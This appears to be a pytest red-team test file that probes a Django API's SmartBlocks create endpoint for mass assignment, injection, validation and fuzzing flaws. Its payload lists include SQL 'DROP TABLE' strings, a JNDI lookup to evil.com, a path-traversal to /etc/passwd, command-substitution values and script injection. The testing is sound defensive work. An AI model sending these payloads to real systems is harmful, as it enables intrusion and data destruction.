"""Red Team security tests for SmartBlocks CREATE endpoint (T235).

Tests focus on:
- API3:2023 BOPLA (mass assignment)
- Injection in create payload
- Validation bypass
- Resource limits
"""

import json

import pytest

from model_bakery import baker

from api.core.models import User
from api.schedule.models import SmartBlock
from api.storage.models import File


@pytest.mark.django_db(transaction=True)
class TestSmartBlockCreateRedTeam:
    """Red Team tests for POST /api/v2/smart-blocks."""

    def setup_method(self):
        """Clean up before each test."""
        SmartBlock.objects.all().delete()
        File.objects.filter(owner__username__startswith="testred").delete()
        File.objects.filter(owner__username__startswith="testred").delete()
        User.objects.filter(username__startswith="testred").delete()

    # ========================================================================
    # API3:2023 - BOPLA
    # ========================================================================

    @pytest.mark.xfail(reason="T426: Mass assignment - id field accepted")
    def test_bopla_mass_assignment_id(self, api_client):
        """BOPLA: Setting id field should be rejected."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "id": 99999,
                    "name": "Test Block",
                    "kind": SmartBlock.Kind.STATIC,
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            data = response.json()
            assert data.get("id") != 99999, "BOPLA: Custom ID accepted"

    @pytest.mark.xfail(
        reason="T427: Mass assignment - created_at manipulation",
    )
    def test_bopla_mass_assignment_created_at(self, api_client):
        """BOPLA: Setting created_at should be rejected."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Test Block",
                    "kind": SmartBlock.Kind.STATIC,
                    "created_at": "2020-01-01T00:00:00Z",
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            data = response.json()
            assert "2020" not in data.get(
                "created_at",
                "",
            ), "BOPLA: created_at was modified"

    # ========================================================================
    # Injection
    # ========================================================================

    def test_create_sql_injection_name(self, api_client):
        """SQLi: Injection in name field."""
        sqli_names = [
            "Block' OR '1'='1",
            "Block'; DROP TABLE cc_block;--",
            "${jndi:ldap://evil.com}",
        ]

        for name in sqli_names:
            response = api_client.post(
                "/api/v2/smart-blocks",
                json.dumps(
                    {
                        "name": name,
                        "kind": SmartBlock.Kind.STATIC,
                    },
                ),
                content_type="application/json",
            )
            # Should not crash with 500
            assert response.status_code in [
                201,
            ], f"SQLi name caused {response.status_code}"

    def test_create_sql_injection_description(self, api_client):
        """SQLi: Injection in description field."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Test Block",
                    "description": "'; DROP TABLE users;--",
                    "kind": SmartBlock.Kind.STATIC,
                },
            ),
            content_type="application/json",
        )
        assert response.status_code in [
            201,
        ], f"SQLi description caused {response.status_code}"

    # ========================================================================
    # Validation
    # ========================================================================

    def test_create_empty_name(self, api_client):
        """Validation: Empty name should be rejected."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "",
                    "kind": SmartBlock.Kind.STATIC,
                },
            ),
            content_type="application/json",
        )
        assert (
            response.status_code == 400
        ), f"Empty name accepted with {response.status_code}"

    def test_create_whitespace_name(self, api_client):
        """Validation: Whitespace-only name should be rejected."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "   ",
                    "kind": SmartBlock.Kind.STATIC,
                },
            ),
            content_type="application/json",
        )
        assert (
            response.status_code == 400
        ), f"Whitespace name accepted with {response.status_code}"

    def test_create_invalid_kind(self, api_client):
        """Validation: Invalid kind should be rejected."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Test Block",
                    "kind": 999,
                },
            ),
            content_type="application/json",
        )
        assert (
            response.status_code == 400
        ), f"Invalid kind accepted with {response.status_code}"

    def test_create_name_too_long(self, api_client):
        """Validation: Extremely long name should be rejected."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "X" * 10000,
                    "kind": SmartBlock.Kind.STATIC,
                },
            ),
            content_type="application/json",
        )
        assert response.status_code in [
            400,
        ], f"Long name accepted with {response.status_code}"

    # ========================================================================
    # Edge Cases
    # ========================================================================

    @pytest.mark.xfail(reason="FUCK: NO FILTER INJECTION AND PATH TRAVERSAL")
    def test_create_unicode_injection(self, api_client):
        """Edge: Unicode and special chars in name."""
        unicode_names = [
            "日本語" * 100,
            "🎵🎶🎼" * 100,
            "<script>alert(1)</script>",
            "../../../etc/passwd",
        ]

        for name in unicode_names:
            response = api_client.post(
                "/api/v2/smart-blocks",
                json.dumps(
                    {
                        "name": name,
                        "kind": SmartBlock.Kind.STATIC,
                    },
                ),
                content_type="application/json",
            )
            assert response.status_code in [
                400,
            ], f"Unicode '{name[:20]}' caused {response.status_code}"

    def test_create_no_auth(self, client):
        """Auth: No auth should fail."""
        response = client.post(
            "/api/v2/smart-blocks",
            json.dumps({"name": "Test"}),
            content_type="application/json",
        )
        assert response.status_code == 403


@pytest.mark.django_db(transaction=True)
class TestSmartBlockCreateAdvancedRedTeam:
    """Advanced Red Team tests - extended attack surface."""

    def setup_method(self):
        """Clean up before each test."""
        SmartBlock.objects.all().delete()
        File.objects.filter(owner__username__startswith="testred").delete()
        User.objects.filter(username__startswith="testred").delete()

    # ========================================================================
    # API3:2023 - BOPLA Extended
    # ========================================================================

    @pytest.mark.xfail(reason="T428: Mass assignment - owner field accepted")
    def test_bopla_mass_assignment_owner(self, api_client):
        """BOPLA: Setting owner field should be rejected - BOLA vector."""
        victim = baker.make(User, username="testred_victim")
        attacker = baker.make(User, username="testred_attacker")

        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Hijacked Block",
                    "kind": SmartBlock.Kind.STATIC,
                    "owner": victim.id,
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            data = response.json()
            assert (
                data.get("owner") != victim.id
            ), "BOPLA/BOLA: Can assign block to another user"

    @pytest.mark.xfail(
        reason="T431: Mass assignment - updated_at manipulation",
    )
    def test_bopla_mass_assignment_updated_at(self, api_client):
        """BOPLA: Setting updated_at should be rejected."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Test Block",
                    "kind": SmartBlock.Kind.STATIC,
                    "updated_at": "2030-12-31T23:59:59Z",
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            data = response.json()
            assert "2030" not in data.get(
                "updated_at",
                "",
            ), "BOPLA: updated_at was set to future"

    @pytest.mark.xfail(
        reason="T432: Mass assignment - length field manipulation",
    )
    def test_bopla_mass_assignment_length(self, api_client):
        """BOPLA: Setting length field should be rejected or validated."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Test Block",
                    "kind": SmartBlock.Kind.STATIC,
                    "length": "PT1000H",  # 1000 hours
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            data = response.json()
            # Should either reject or have reasonable limits
            assert (
                data.get("length") is None or response.status_code == 400
            ), "BOPLA: Arbitrary length accepted"

    # ========================================================================
    # Content-Type Confusion & HTTP Attacks
    # ========================================================================

    def test_create_content_type_confusion_text_plain(self, api_client):
        """Content-Type confusion: text/plain should fail."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            '{"name": "Test", "kind": "static"}',
            content_type="text/plain",
        )
        # Should reject or handle properly
        assert response.status_code in [
            415,
        ], f"text/plain caused unexpected {response.status_code}"

    def test_create_content_type_confusion_form_data(self, api_client):
        """Content-Type confusion: form-data should fail."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            {"name": "Test", "kind": "static"},
            content_type="multipart/form-data",
        )
        assert response.status_code in [
            400,
        ], f"form-data caused unexpected {response.status_code}"

    @pytest.mark.xfail(reason="FUCK: WE CAN'T OVERRIDE METHOD BY HEADER")
    def test_create_http_method_override(self, api_client):
        """HTTP Method Override header - potential bypass vector."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps({"name": "Test"}),
            content_type="application/json",
            HTTP_X_HTTP_METHOD_OVERRIDE="PUT",
        )
        # Should still create or reject, not crash
        assert response.status_code in [
            405,
        ], f"Method override caused {response.status_code}"

    # ========================================================================
    # JSON Attacks
    # ========================================================================

    @pytest.mark.xfail(reason="FUCK: JSON KEYS COLLIDED")
    def test_create_json_key_collision(self, api_client):
        """JSON Key Collision: duplicate keys behavior."""
        # Send raw JSON with duplicate keys
        response = api_client.post(
            "/api/v2/smart-blocks",
            '{"name": "First", "name": "Second", "kind": "static"}',
            content_type="application/json",
        )
        # Should handle gracefully - either reject or use last value
        assert response.status_code in [
            400,
        ], f"Key collision caused {response.status_code}"

    def test_create_json_deeply_nested(self, api_client):
        """JSON Deep Nesting: potential DoS."""
        # Create deeply nested structure
        nested = {"name": "Test"}
        for _ in range(100):
            nested = {"nested": nested}

        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(nested),
            content_type="application/json",
        )
        assert response.status_code in [
            400,
        ], f"Deep nesting caused {response.status_code}"

    @pytest.mark.xfail(reason="FUCK: ESCAPED INJECTION DETECTED")
    def test_create_json_unicode_escape(self, api_client):
        """JSON Unicode Escape: bypass potential."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            '{"name": "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E", "kind": "static"}',
            content_type="application/json",
        )
        # Should handle unicode escapes properly
        assert response.status_code in [
            400,
        ], f"Unicode escape caused {response.status_code}"

    # ========================================================================
    # Input Validation - Extended
    # ========================================================================

    def test_create_null_bytes_in_name(self, api_client):
        """Validation: Null bytes should be rejected."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Test\x00Block",
                    "kind": SmartBlock.Kind.STATIC,
                },
            ),
            content_type="application/json",
        )
        assert (
            response.status_code == 400
        ), f"Null bytes accepted with {response.status_code}"

    def test_create_negative_length(self, api_client):
        """Validation: Negative length should be rejected."""
        response = api_client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Test Block",
                    "kind": SmartBlock.Kind.STATIC,
                    "length": "PT-1H",
                },
            ),
            content_type="application/json",
        )
        assert response.status_code in [
            400,
        ], f"Negative length caused {response.status_code}"

    def test_create_name_only_whitespace_variations(self, api_client):
        """Validation: Various whitespace-only names."""
        whitespace_names = [
            " ",
            "   ",
            "\t",
            "\n",
            "\r",
            "\t\n\r ",
            "\u00a0",  # Non-breaking space
            "\u2000",  # En quad
            "\u2003",  # Em space
            "\u3000",  # Ideographic space
        ]

        for name in whitespace_names:
            response = api_client.post(
                "/api/v2/smart-blocks",
                json.dumps({"name": name, "kind": SmartBlock.Kind.STATIC}),
                content_type="application/json",
            )
            assert (
                response.status_code == 400
            ), f"Whitespace '{repr(name)}' accepted with {response.status_code}"

    @pytest.mark.xfail(reason="FUCK: CONTROL CHARS DETECTED")
    def test_create_name_with_control_chars(self, api_client):
        """Validation: Control characters should be rejected."""
        control_chars = [
            "Test\x01Block",
            "Test\x1fBlock",
            "Test\x7fBlock",
        ]

        for name in control_chars:
            response = api_client.post(
                "/api/v2/smart-blocks",
                json.dumps({"name": name, "kind": SmartBlock.Kind.STATIC}),
                content_type="application/json",
            )
            assert response.status_code in [
                400,
            ], f"Control chars caused unexpected {response.status_code}"

    # ========================================================================
    # NoSQL Injection / MongoDB-style Attacks
    # ========================================================================

    def test_create_nosql_injection_kind(self, api_client):
        """NoSQLi: MongoDB-style operators in kind field."""
        nosql_payloads = [
            {"name": "Test", "kind": {"$ne": None}},
            {"name": "Test", "kind": {"$gt": ""}},
            {"name": "Test", "kind": {"$regex": ".*"}},
            {"name": "Test", "kind": {"$in": ["static", "dynamic"]}},
        ]

        for payload in nosql_payloads:
            response = api_client.post(
                "/api/v2/smart-blocks",
                json.dumps(payload),
                content_type="application/json",
            )
            # Should not crash with 500
            assert response.status_code in [
                400,
            ], f"NoSQLi payload caused {response.status_code}"

    # ========================================================================
    # Race Conditions
    # ========================================================================

    @pytest.mark.xfail(
        reason="T433: Race condition - duplicate names possible",
    )
    def test_create_race_condition_duplicate_names(self, api_client):
        """Race: Concurrent creation with same name."""
        import concurrent.futures

        results = []

        def create_block():
            response = api_client.post(
                "/api/v2/smart-blocks",
                json.dumps({"name": "RaceTestBlock", "kind": "static"}),
                content_type="application/json",
            )
            return response.status_code

        # Fire 5 concurrent creations with same name
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(create_block) for _ in range(5)]
            results = [
                f.result() for f in concurrent.futures.as_completed(futures)
            ]

        success_count = results.count(201)
        # Either all succeed (no unique constraint) or only one succeeds
        # Both are valid behaviors, but we document which one occurs
        assert success_count >= 1, "At least one creation should succeed"

    # ========================================================================
    # Fuzzing - SecLists Integration
    # ========================================================================

    @pytest.mark.xfail(reason="FUCK: WE NEED TO FILTER DANGEROUS VALUES")
    def test_create_fuzzing_naughty_strings_name(self, api_client):
        """Fuzzing: Naughty strings from SecLists in name."""
        naughty_strings = [
            "undefined",
            "null",
            "None",
            "NULL",
            "nil",
            "True",
            "False",
            "true",
            "false",
            "[]",
            "{}",
            "[object Object]",
            "NaN",
            "Infinity",
            "-Infinity",
            "<script>alert('xss')</script>",
            "';--",
            '";--',
            "');--",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<%= 7*7 %>",
            "$(touch /tmp/pwned)",
            "`whoami`",
        ]

        for string in naughty_strings:
            response = api_client.post(
                "/api/v2/smart-blocks",
                json.dumps({"name": string, "kind": "static"}),
                content_type="application/json",
            )
            assert response.status_code in [
                400,
            ], f"Naughty string '{string[:30]}' caused {response.status_code}"

    @pytest.mark.xfail(reason="FUCK: BIG VALUES MUST BE FILTERED BY 400")
    def test_create_fuzzing_overflow_values(self, api_client):
        """Fuzzing: Integer overflow and extreme values."""
        overflow = {
            -1: 201,
            0: 201,
            99999999999999999999999999999999999: 400,
            -2**32 - 1: 201,
            2**32 + 1: 201,
            -2**64 - 1: 400,
            2**64 + 1: 400,
        }

        for value, expected in overflow.items():
            data = json.dumps({"name": value, "kind": "static"})
            response = api_client.post(
                "/api/v2/smart-blocks",
                data,
                content_type="application/json",
            )
            assert response.status_code in [
                expected,
            ], f"Overflow value {value} caused {response.status_code}"
